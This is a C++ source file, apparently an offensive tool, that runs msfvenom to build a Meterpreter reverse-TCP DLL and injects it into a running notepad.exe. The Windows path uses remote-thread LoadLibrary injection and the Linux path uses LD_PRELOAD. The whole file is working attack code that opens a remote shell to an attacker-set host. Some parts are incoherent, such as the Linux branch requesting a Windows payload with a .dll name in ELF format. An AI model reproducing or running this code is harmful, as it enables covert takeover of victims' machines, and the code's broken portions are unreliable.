#include <iostream>
#include <cstdlib>
#include <string>

#ifdef _WIN32
    #include <windows.h>
    #include <tlhelp32.h>
    #define PAYLOAD "windows/x64/meterpreter/reverse_tcp"
    #define TARGET_PROCESS "notepad.exe"
    #define LOAD_LIBRARY "LoadLibraryA"
    #define DLL_EXTENSION ".dll"
#else
    #include <unistd.h>
    #include <sys/types.h>
    #include <sys/wait.h>
    #define PAYLOAD "windows/x64/meterpreter_reverse_tcp"
    #define TARGET_PROCESS "notepad.exe"
    #define LOAD_LIBRARY "LoadLibrary"
    #define DLL_EXTENSION ".dll"
#endif

#define LHOST "0.0.0.0" // ⚠️ Replace with your desired IP address
#define LPORT 9999 // ⚠️ Replace with your desired port number

class MetasploitDLLGenerator {
public:
    MetasploitDLLGenerator(const std::string& payload, const std::string& lhost, int lport)
        : payload_(payload), lhost_(lhost), lport_(lport) {}

    bool GenerateAndInjectDLL(const std::string& outputFilename, const std::string& targetProcessName) {
        std::string command = "msfvenom -p " + payload_ + " LHOST=" + lhost_ + " LPORT=" + std::to_string(lport_) +
                              " -f " + GetDLLFormat() + " -o " + outputFilename;

        int result = std::system(command.c_str());
        if (result != 0) {
            std::cout << "Failed to generate Metasploit DLL." << std::endl;
            return false;
        }

        bool success = false;
#ifdef _WIN32
        success = InjectDLLWindows(outputFilename, targetProcessName);
#else
        success = InjectDLLLinux(outputFilename, targetProcessName);
#endif

        if (success) {
            std::cout << "Successfully injected Metasploit DLL." << std::endl;
        } else {
            std::cout << "Failed to inject Metasploit DLL." << std::endl;
        }

        return success;
    }

private:
    std::string payload_;
    std::string lhost_;
    int lport_;

    std::string GetDLLFormat() const {
#ifdef _WIN32
        return "dll";
#else
        return "elf";
#endif
    }

#ifdef _WIN32
    bool InjectDLLWindows(const std::string& dllFilename, const std::string& targetProcessName) {
        HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, GetProcessIdByName(targetProcessName));
        if (hProcess == NULL) {
            std::cout << "Failed to open the target process." << std::endl;
            return false;
        }

        LPVOID pRemoteBuf = VirtualAllocEx(hProcess, NULL, dllFilename.size(), MEM_COMMIT, PAGE_READWRITE);
        if (pRemoteBuf == NULL) {
            std::cout << "Failed to allocate memory in the target process." << std::endl;
            CloseHandle(hProcess);
            return false;
        }

        if (!WriteProcessMemory(hProcess, pRemoteBuf, dllFilename.c_str(), dllFilename.size(), NULL)) {
            std::cout << "Failed to write DLL path to the target process." << std::endl;
            VirtualFreeEx(hProcess, pRemoteBuf, 0, MEM_RELEASE);
            CloseHandle(hProcess);
            return false;
        }

        HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandleA("kernel32.dll"), LOAD_LIBRARY), pRemoteBuf, 0, NULL);
        if (hThread == NULL) {
            std::cout << "Failed to create a remote thread in the target process." << std::endl;
            VirtualFreeEx(hProcess, pRemoteBuf, 0, MEM_RELEASE);
            CloseHandle(hProcess);
            return false;
        }

        WaitForSingleObject(hThread, INFINITE);

        VirtualFreeEx(hProcess, pRemoteBuf, 0, MEM_RELEASE);
        CloseHandle(hThread);
        CloseHandle(hProcess);

        return true;
    }

    DWORD GetProcessIdByName(const std::string& processName) {
        DWORD processId = 0;
        HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (hSnapshot != INVALID_HANDLE_VALUE) {
            PROCESSENTRY32 pe32;
            pe32.dwSize = sizeof(PROCESSENTRY32);
            if (Process32First(hSnapshot, &pe32)) {
                do {
                    if (processName.compare(pe32.szExeFile) == 0) {
                        processId = pe32.th32ProcessID;
                        break;
                    }
                } while (Process32Next(hSnapshot, &pe32));
            }
        }
        CloseHandle(hSnapshot);
        return processId;
    }
#else
    bool InjectDLLLinux(const std::string& dllFilename, const std::string& targetProcessName) {
        pid_t pid = GetProcessIdByName(targetProcessName);
        if (pid == -1) {
            std::cout << "Failed to find the target process." << std::endl;
            return false;
        }

        std::string command = "LD_PRELOAD=" + dllFilename + " " + targetProcessName + " &";
        int result = std::system(command.c_str());
        if (result != 0) {
            std::cout << "Failed to inject DLL into the target process." << std::endl;
            return false;
        }

        return true;
    }

    pid_t GetProcessIdByName(const std::string& processName) {
        pid_t pid = -1;
        FILE* fp;
        char* line = nullptr;
        size_t len = 0;
        ssize_t read;

        fp = popen(("pidof " + processName).c_str(), "r");
        if (fp == nullptr) {
            return pid;
        }

        while ((read = getline(&line, &len, fp)) != -1) {
            pid = atoi(line);
            break;
        }

        pclose(fp);
        free(line);

        return pid;
    }
#endif
};

int main() {
    std::string payload = PAYLOAD;
    std::string lhost = LHOST;
    int lport = LPORT;
    std::string targetProcess = TARGET_PROCESS;
    std::string dllFilename = "metasploit" + std::string(DLL_EXTENSION);

    MetasploitDLLGenerator generator(payload, lhost, lport);
    bool success = generator.GenerateAndInjectDLL(dllFilename, targetProcess);
    if (!success) {
        std::cout << "Failed to generate and inject Metasploit DLL." << std::endl;
        return 1;
    }

    return EXIT_SUCCESS;
}
